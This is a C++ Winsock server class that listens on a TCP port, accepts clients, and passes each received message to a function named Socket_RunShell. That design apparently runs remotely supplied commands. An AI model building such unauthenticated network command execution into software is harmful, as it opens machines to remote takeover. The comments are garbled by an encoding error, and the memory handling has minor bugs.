#include <pch.h>
#ifndef SSocketClass_CPP
#define SSocketClass_CPP
#include "SSocket.h"

int SSocketClass::Entrance() {
	Loading();
	SocketStart();
	return 0;
}
void SSocketClass::SocketStart() {
	WSADATA wsaData;
	WSAStartup(0x0202, &wsaData);

	sServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //�����ͻ����׽���
	SOCKADDR_IN server = Socket_Initialization();

	// ��Socket Server�����ص�ַ
	int result; //����
	result = ::bind(sServer, (const struct sockaddr*) & server, sizeof(sockaddr_in));
	if (result == SOCKET_ERROR) { goto SocketStop; }

	// ����
	result = listen(sServer, 1);
	if (result == SOCKET_ERROR) { goto SocketStop; }

	//ѭ���ȴ�
	while (!SocketStopFlac) {
		sockaddr_in socketIn;
		int socketInlen = sizeof(socketIn);
		SOCKET client;
		client = accept(sServer, (sockaddr FAR*) & socketIn, &socketInlen);
		if (client != INVALID_SOCKET) {
			// list
			clientList.push_back(client);

			/* While Recv */
			std::thread RecvSocket(&SSocketClass::Recv_Socket_While, this, client); RecvSocket.detach();

			/* While Send */
			std::thread SendSocket(&SSocketClass::Send_Socket_While, this, client); SendSocket.detach();
		}
		else {
			int err = WSAGetLastError();
			if (err == WSAEWOULDBLOCK) { Sleep(100); continue; }
			else { goto SocketStop; }
		}
	}

SocketStop:
	/* Stop Socket */
	for (SOCKET client : clientList) {
		SocketStop(client);
	}
	SocketStop(sServer);
	WSACleanup();
}
void SSocketClass::SocketStop(SOCKET socket) {
	// �ͷ����Ӻͽ��н�������      
	closesocket(socket);
	socket = NULL;
}
void SSocketClass::Recv_Socket_While(SOCKET socket) {
	while (!SocketStopFlac) {
		std::vector<std::string> Recv_Cache;
		if (!Recv_Socket(socket, &Recv_Cache)) { break; } // �˳��߳�
		if (Recv_Cache.empty()) { continue; }
		for (std::string data : Recv_Cache) {
			Socket_RunShell(socket, data);
		}
	}
}
bool SSocketClass::Send_Socket(SOCKET socket, std::string data) {
	int result; //send result
	while (true) {
		if (w) { data = flac_Start + data + flac_End; } // ��Ҫ����w����
		result = send(socket, data.c_str(), (int)data.size(), 0); //��������
		if (result == SOCKET_ERROR) {
			int err = WSAGetLastError();
			if (err == WSAEWOULDBLOCK) {
				Sleep(100);
				continue;
			}
			else { //����ʧ��
				return false;
			}
		}
		return true;
	}
}
bool SSocketClass::Recv_Socket(SOCKET socket, std::vector<std::string>* allResult) {
	/* Initialization */
	int result; //recv result
	int ConfigCache = socketCache; //���õĻ����С
	char* result_byte = new char[ConfigCache]; //��������byte
	std::string allData = ""; //�Ѿ���������
	ULONG MoreLen; //ʣ�µ����ݴ�С
	std::string recvTemp = recvTempList[socket];
	if (recvTemp.empty()) { recvTempList[socket] = ""; } // û�����ݾʹ���

	/* While Reve */
W_recv:
	while (true) {
		result = recv(socket, result_byte, ConfigCache - 1, 0); //��������(��Ҫ��ӽ����������-1)
		if (result == SOCKET_ERROR) {
			int err = WSAGetLastError();
			if (err == WSAEWOULDBLOCK) {
				continue;
			}
			else { //����ʧ��
				//SocketStop(socket);
				return false;
			}
		}
		// �Ƿ�����ʱ����
		if (!recvTemp.empty()) { allData = recvTemp; recvTemp = ""; }
		/* Recv */
		result_byte[result] = 0x00; //��ӽ������
		allData += std::string(result_byte, result); //Cache >> AllResult
		memset(result_byte, 0, ConfigCache); //���֮ǰ������
		ioctlsocket(socket, FIONREAD, &MoreLen); //���ʣ�µ�����
		if (MoreLen == 0 || allData.length() > 50000) { //�������
			// ��Ҫ����w����
			if (w) {
				int findStart, findEnd;
				while ((findStart = (int)allData.find(flac_Start)) != -1 && findStart < allData.length() && (findEnd = (int)allData.find(flac_End, findStart)) != -1) {
					// �ȷ����ݣ����޸�����
					int subStart = findStart + (int)flac_Start.length();
					std::string onlyData = allData.substr(subStart, findEnd - subStart);
					if (onlyData.empty()) { continue; }
					while (true) { // ������ݰ����ң�����ǰ��һ����
						int findStart_ = (int)onlyData.find(flac_Start);
						if (findStart_ == -1) { break; }
						onlyData = onlyData.substr(findStart_ + (int)flac_Start.length());
					}
					allResult->push_back(onlyData);
					allData = allData.substr(findEnd + flac_End.length());
				}
				// ���������ʱ���ݾʹ�����(û��Ҫ�ж�)
				recvTemp = allData;
				if (!allResult->empty()) { goto W_success; }
			}
			// ����Ҫ����w����
			else {
				allResult->push_back(allData);
				goto W_success;
			}
		}
		goto W_recv;
	}
W_success:
	recvTempList[socket] = recvTemp;
	delete result_byte;
	return true;
}
#endif